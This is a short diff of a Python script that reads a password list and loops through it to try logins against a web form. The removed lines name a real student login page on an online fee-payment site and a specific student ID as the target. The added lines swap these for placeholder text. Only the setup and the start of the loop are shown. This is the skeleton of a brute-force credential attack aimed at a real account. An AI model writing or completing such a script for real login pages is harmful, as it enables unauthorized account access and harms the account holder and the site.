@@ -4,8 +4,8 @@ password_list_file = "passwords.txt"
 with open(password_list_file, "r") as file:
     passwords = file.readlines()
 
-url = "https://onlinefeestechnocrats.in/LoginStudent.aspx?type=F"  # Add the website URL or API endpoint here
-username = "0191AL221037"  # Add your username here
+url = "hhbn.chmb"  # Add the website URL or API endpoint here
+username = "vhvh"  # Add your username here
 
 for password in passwords:
     password = password.strip()  # Remove leading/trailing whitespace
